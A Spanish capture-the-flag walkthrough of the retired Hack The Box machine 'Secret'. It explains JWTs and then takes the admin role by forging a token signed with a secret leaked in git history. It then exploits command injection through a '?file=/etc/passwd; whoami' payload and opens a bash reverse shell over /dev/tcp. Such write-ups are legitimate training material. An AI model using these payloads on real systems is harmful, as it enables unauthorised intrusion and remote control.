
![Pasted image 20250422220257](https://github.com/user-attachments/assets/25e8ddb5-e971-4673-8c89-0afc5a8eb977)

Secret es una maquina retirada de Hack The Box que vamos a utilizar para analizar el funcionamiento de una api, modificar el jason web token de autenticación y finalmente explotar un RCE, ejecución remota de comandos, inyectando código en un parámetro.

# Que es un JASON Web Token
Antes de nada, entendamos en que consiste un Jason Web Token.
Un JSON Web Token es un formato para intercambiar información de manera segura entre dos partes. El uso que más se le da es para proporcionar un token de sesion a un usuario autenticado en un servicio.
### Cómo se estructura:
Un JWT tiene 3 partes separadas por puntos `.` de la forma:

*HEADER.PAYLOAD.SIGNATURE*

- Header: Aquí se describe como está firmado el token, el tipo de toquen y el algoritmo utilizdo, por ejemplo
```json
{
	"alg":"HS256",
	"typ":"JWT"
}
```
- Payload: En esta sección se guardan los datos del usuario. Por ejemplo, noombre de usuario, rol, y el tiempo de caducidad del token.
```JSON
{
  "name": "theadmin",
  "role": "admin",
  "iat": 1710000000,
  "exp": 1710003600
}
```

- Signature: Esta sección es una especie de firma, que nos asegura que el contenido del payload no ha sido modificado. Esto se consigue codificando tanto el Header como el Payload mediante alguna funcion hash (definida en el HEADER) y una clave secreta. De esta forma, en el caso de que alguna parte del token sea modificada, cambiará tambien la seccion signature. 
```css
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  clave_secreta
)
```

En esta máquina, conseguiremos, debido a una mala gestión de un proyecto en git la clave secreta utilizada en la creación del JWT. De esta forma podemos crear un nuevo JWT y logearnos como el usuario administrador sin conocer la contraseña.

# Máquina Secret

## Escaneo

Lo primero de todo en esta máquina es analizar los puertos abiertos mediante la herramienta nmap:
`` sudo nmap -p- --open -sCV --min-rate 5000 -n -v -Pn -oN nmap/targeted 10.10.11.120
Esto nos reporta la siguiente información:

![Pasted image 20250421211339](https://github.com/user-attachments/assets/be195489-1cf4-402b-b21d-90376e481a5a)

Tras un analisis de los servicios http de los puertos 80 y 3000 vemos que alojan el mismo servicio.
La página se ve de la siguiente forma: 

![Pasted image 20250421211410](https://github.com/user-attachments/assets/e8262d64-9157-4144-b26d-55174f93edc6)

Desde la cual, podemos acceder a la api desde el botón de arriba a la derecha "live demo" y podemos descargar el código fuente de la api desde el boton de la parte inferior de descarga.
## Análisis del código
Analizamos el código. Dentro de la carpeta routes tenemos el archivo auth.js en el cual podemos ver:
### Registro de usuario:
El proceso de registrar un nuevo usuario:

![Pasted image 20250422212112](https://github.com/user-attachments/assets/f95f9915-4da8-4f65-a148-52ffbefcc46f)

Aquí vemos que, al realizar una petición por el método post a la url /register en el cual enviemos en el body de la petición los campos, name, email y password nos creará un usuario.
Más en detalle en el punto 1 indica el método y la url, bajo el punto 1 se ejecutan varias instrucciones que comprueban si la petición contiene el campo body y si existen mail y usuarios ya registrados. Tras esto, en el punto 2 crea un hash de la contraseña y en el punto 3 crea el nuevo usuario asignándole estos campos. Por ultimo, la api nos devuelve una respuesta con el campo user y nuestro usuario.

### Logearnos como un usuario:

![Pasted image 20250422212535](https://github.com/user-attachments/assets/6f20ea65-99c6-4ca8-b3c5-a894b9c4d2d0)

En esta sección vemos lo que pasa cuando realizamos una petición por el método post a la url /login.
Vemos que primero se ejecutan una serie de comprobaciones para ver si el mail y la contraseña son validos y en el caso de que lo sea, en el punto 2 nos crea un jwt, un jason web token creado a partid del id, name, email y el token secreto. Este token se nos envía de vuelta con el nombre auth-token.

### Area privada

Una vez logeados, podemos acceder, aportando nuestro auth-token al área privada, estos son los campos /priv y /logs

![Pasted image 20250422213056](https://github.com/user-attachments/assets/f6f648b4-cb6a-46d7-aa8e-9e0482167f3b)

En /priv, comprueba que el nombre del usuario del jwt proporcionado sea theadmin, si lo es nos devuelve un json confirmandonos que somos el usuario administrador. Si no lo es, nos dice que somos un normal user.
Esta validación de la validez del token se realiza mediante la funcion verifytoken.js:

![Pasted image 20250422213357](https://github.com/user-attachments/assets/0810fe76-e1a6-4525-afbf-f4f93d95bcb3)

Y por ultimo tenemos la sección /logs que de la misma manera que /priv si mandamos en las cabeceras un jwt válido y este pertenece a theadmin nos ejecutará el código marcado por el punto 1:

![Pasted image 20250422213509](https://github.com/user-attachments/assets/fe46fa38-71b5-4597-b6a4-2538fdafb289)

Vemos que, en el caso de ejecutarse el código, no aplica ninguna sanitización del parámetro que nosotros le estamos pasando, lo que nos permitiría ejecutar código en la máquina.
Podríamos realizar pasando el parámetro file por el metodo get, por ejemplo, "?file=/etc/passwd; whoami"

## Enumeración
En el archivo que nos hemos descargado donde hemos encontrado el código fuente de la aplicación vemos un proyecto .git. Consultando los logs de este proyecto con el comando `git log` Vemos:

![Pasted image 20250421224531](https://github.com/user-attachments/assets/7f988210-14ab-4e46-944e-d891a3774c1d)

Y al comprobar los cambios pasándole el id del commit ``git show <id>``

![Pasted image 20250421224626](https://github.com/user-attachments/assets/0b1b7f27-5fa4-446d-b1be-386f3b2dc2fc)

Vemos el token secreto que se usa para generar los JWT.

Veamos el funcionamiento de esta api registrando un usuario y logearnos obteniendo su JWT, así como accediendo a las secciones de administrador:

![Pasted image 20250421211810](https://github.com/user-attachments/assets/b088f050-7f1b-44ed-811c-d5b99edea3fc)

Una vez hecho esto, tenemos que modificar el JWT para cambiarlo por el JWT del administrador. Lo hacemos desde la web https://jwt.io

![Pasted image 20250421222308](https://github.com/user-attachments/assets/d0c07eb8-a273-47d8-a65b-1a664c174ad2)

Modificamos el campo name con el usuario theadmin e introducimos el token secreto en la parte de la firma y obtenemos el auth-token de theadmin:

![Pasted image 20250421224829](https://github.com/user-attachments/assets/1464670b-15ef-4837-9090-96d0588e1e7e)

## Explotación
Como hemos visto en la sección en la que analizabamos el codigo. Podemos pasar mediante el parametro file, un payload para ejecutar código remoto en la maquina de la forma:

![Pasted image 20250421225050](https://github.com/user-attachments/assets/28946a5b-1f35-40c6-9a83-5fdd5476e309)

Y con esto, nos podemos establecer una reverse shell mediante al comando: ``bash -c "bash -i >& /dev/tcp/10.10.16.12/443 0>&1"

![Pasted image 20250421225323](https://github.com/user-attachments/assets/8d1124c5-9de1-429c-9912-8ee846506e4d)

Ganando así acceso a la máquina.
